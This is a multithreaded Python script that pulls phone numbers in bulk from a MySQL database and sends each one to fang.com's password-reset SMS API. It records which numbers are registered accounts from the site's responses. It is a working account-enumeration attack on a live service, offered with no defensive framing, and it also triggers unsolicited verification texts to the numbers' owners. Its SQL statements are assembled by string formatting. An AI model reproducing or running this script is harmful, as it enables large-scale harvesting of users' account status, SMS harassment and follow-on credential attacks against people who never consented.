import requests
import json
import queue
import threading
import pymysql
import warnings
warnings.filterwarnings("ignore")
from threading import Lock

from config import *

"""
    找回密码
    https://m.fang.com/passport/resetpassword.aspx?Burl=/passport/login.aspx&BurlType=2
"""


class LinkMysql(object):
    def __init__(self):
        self.link_mysql()
        self.check_table()
        self.read_page = STARTPAGE

    def link_mysql(self):
        try:
            self.conn = pymysql.connect(host=HOST, port=PORT, user=USER, password=PASSWORD, database=DATABASE)
            self.cursor = self.conn.cursor()
        except Exception as e:
            print("\n数据库连接失败：%s\n请检查MYSQL配置！\n" % e)

    def check_table(self):
        sql = "CREATE TABLE IF NOT EXISTS %s" % SAVE_TABLE + \
              "(id INT (11) AUTO_INCREMENT, mobile VARCHAR(11), " \
              "PRIMARY KEY(id), UNIQUE KEY `mobile` (`mobile`) USING BTREE); "
        self.cursor.execute(sql)

    def get_mobile(self):
        sql = "SELECT %s" % COLUMN + " FROM %s" % TABLE + " LIMIT %s, %s; " % \
                (self.read_page * PAGESIZE, PAGESIZE)
        self.cursor.execute(sql)
        results = self.cursor.fetchall()  # 读取结果

        mobiles = []
        for result in results:      # 清洗数据
            mobile = result[0]        # 取(10086,)第一元
            if len(mobile) == 11:
                mobiles.append(mobile)
            elif len(mobile) > 11:
                mobiles.append(mobile.strip()[-11:])    # 后11位

        return mobiles

    def save_mobile(self, mobile):
        try:
            sql = "INSERT IGNORE INTO %s" % SAVE_TABLE + "(mobile) VALUES(%s)" % mobile
            self.cursor.execute(sql)
            self.conn.commit()
        except Exception as e:
            print("保存失败：", e)


class FangTX(object):
    def __init__(self):
        self.session = requests.session()
        self.login_url = "https://m.fang.com/passport/resetpwdsendsms.api?MobilePhone=%s&Service=soufun-wap-wap&sendvoice=0"
        self.headers = {
            "referer": "https://m.fang.com/passport/resetpassword.aspx?Burl=/passport/login.aspx&BurlType=2",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

    def get_verify(self, mobile):
        try:
            r = self.session.post(self.login_url % mobile, headers=self.headers)

            if r.status_code == 200:
                try:
                    r = json.loads(r.text)
                    if r["IsShowMathCode"] == "true" or r["Tip"] == "验证码已发送到您的手机，当日内有效":
                        print(mobile)

                        lock.acquire()
                        mysql.save_mobile(mobile)       # 保存结果
                        lock.release()

                    elif r["Tip"] == "手机号未绑定" or r["Tip"] == "您的手机号未正式验证，请先动态登录进行验证":
                        if PRINT == 0:
                            print(mobile, r["Tip"])
                    else:
                        print(mobile, "未知结果", r)

                except Exception:
                    print("请求结果解析异常：", r.text)
            else:
                print("状态码异常：", r.status_code)
                # TODO 异常重试
        except Exception as e:
            self.get_verify(mobile)

    def run(self, ):
        while not q.empty():
            mobile = q.get()
            self.get_verify(mobile)
            # return result   # True or None


if __name__ == '__main__':

    # FangTX().run("13317903673")       # 测试

    mysql = LinkMysql()  # 数据库
    ftx = FangTX()
    q = queue.Queue()  # 队列
    lock = threading.Lock()

    while mysql.read_page < ENDPAGE:
        print("当前读取页面：%s, 分页大小：%s, 开始页面: %s, 结束页面: %s" % (mysql.read_page, PAGESIZE, STARTPAGE, ENDPAGE))

        mobiles = mysql.get_mobile()  # 获取一页数据

        for mobile in mobiles[:]:
            q.put(mobile)

        for i in range(THREAD_NUM):
            t = threading.Thread(target=ftx.run, )
            t.start()

        mysql.read_page = mysql.read_page + 1